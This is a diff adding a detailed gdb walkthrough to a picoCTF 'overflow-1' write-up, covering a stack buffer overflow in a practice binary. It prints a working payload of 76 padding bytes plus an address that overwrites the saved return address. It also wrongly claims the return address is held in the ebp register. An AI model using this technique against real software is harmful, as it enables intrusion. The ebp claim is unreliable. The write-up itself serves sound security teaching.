@@ -130,6 +130,103 @@ Give me a string and lets see what happens:
 Woah, were jumping to 0x80485e6 !
 picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb}Segmentation fault (core dumped)
 ```
+## More detailed explanation
+
+So why did that work? We won't have a nice function that tells us the return address all the time.
+
+In x86 assembly, the memory address of where a program is returning to is held in the `ebp` register, otherwise known as the base pointer. So let's try to see if we can match the register value to what the function prints out for us
+
+```bash
+samson@pico-2019-shell1:/problems/overflow-1$ ./vuln 
+Give me a string and lets see what happens: 
+picoCTF
+Woah, were jumping to 0x8048705 !
+samson@pico-2019-shell1:/problems/overflow-1$ gdb ./vuln
+GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
+... <redacted>
+
+(gdb) r < <(python -c 'print("A"*64)')
+Starting program: /problems/overflow-1/vuln < <(python -c 'print("A"*64)')
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x8048705 !
+[Inferior 1 (process 2891586) exited normally]
+
+(gdb) r < <(python -c 'print("A"*76+"\xe6\x85\x04\x08")')
+Starting program: /problems/overflow-1/vuln < <(python -c 'print("A"*76+"\xe6\x85\x04\x08")')
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x80485e6 !
+Flag File is Missing. please contact an Admin if you are running this on the shell server.
+[Inferior 1 (process 2891439) exited normally]
+```
+
+Just verifying we can send in input through GDB.
+
+```bash
+(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x0804865f <+0>:     push   %ebp
+   0x08048660 <+1>:     mov    %esp,%ebp
+   0x08048662 <+3>:     push   %ebx
+   0x08048663 <+4>:     sub    $0x44,%esp
+   0x08048666 <+7>:     call   0x8048520 <__x86.get_pc_thunk.bx>
+   0x0804866b <+12>:    add    $0x1995,%ebx
+   0x08048671 <+18>:    sub    $0xc,%esp
+   0x08048674 <+21>:    lea    -0x48(%ebp),%eax
+   0x08048677 <+24>:    push   %eax
+   0x08048678 <+25>:    call   0x8048430 <gets@plt>
+   0x0804867d <+30>:    add    $0x10,%esp
+   0x08048680 <+33>:    call   0x8048714 <get_return_address>
+   0x08048685 <+38>:    sub    $0x8,%esp
+   0x08048688 <+41>:    push   %eax
+   0x08048689 <+42>:    lea    -0x17f9(%ebx),%eax
+   0x0804868f <+48>:    push   %eax
+   0x08048690 <+49>:    call   0x8048420 <printf@plt>
+   0x08048695 <+54>:    add    $0x10,%esp
+   0x08048698 <+57>:    nop
+   0x08048699 <+58>:    mov    -0x4(%ebp),%ebx
+   0x0804869c <+61>:    leave  
+   0x0804869d <+62>:    ret    
+End of assembler dump.
+```
+
+We know the `call   0x8048430 <gets@plt>` is where the assembly code gets user input so lets view the important bits of the stack change as we step through it after setting a breakpoint right before it.
+
+```bash
+(gdb) b* 0x08048678
+Breakpoint 1 at 0x8048678
+(gdb) r < <(python -c 'print("A"*76+"\xe6\x85\x04\x08")')
+Starting program: /problems/overflow-1/vuln < <(python -c 'print("A"*76+"\xe6\x85\x04\x08")')
+Give me a string and lets see what happens: 
+
+Breakpoint 1, 0x08048678 in vuln ()
+(gdb) info frame
+Stack level 0, frame at 0xffde0df0:
+ eip = 0x8048678 in vuln; saved eip = 0x8048705
+ called by frame at 0xffde0e20
+ Arglist at 0xffde0de8, args: 
+ Locals at 0xffde0de8, Previous frame's sp is 0xffde0df0
+ Saved registers:
+  ebx at 0xffde0de4, ebp at 0xffde0de8, eip at 0xffde0dec
+```
+
+Note the output: `saved eip = 0x8048705`. As we know the EIP is the instruction pointer that the allows to the CPU to remember where to jump to after returning from a function.
+
+Let's step through with the `next instruction` command and watch what happens after the program receives our input.
+
+```bash
+(gdb) ni
+0x0804867d in vuln ()
+(gdb) i f
+Stack level 0, frame at 0xffde0df0:
+ eip = 0x804867d in vuln; saved eip = 0x80485e6
+ called by frame at 0x41414149
+ Arglist at 0xffde0de8, args: 
+ Locals at 0xffde0de8, Previous frame's sp is 0xffde0df0
+ Saved registers:
+  ebx at 0xffde0de4, ebp at 0xffde0de8, eip at 0xffde0dec
+```
+
+There we go. We overwrote the old value of the eip and now the program should technically jump wherever we want, in our case the address of the flag.
 
 ## Flag
 
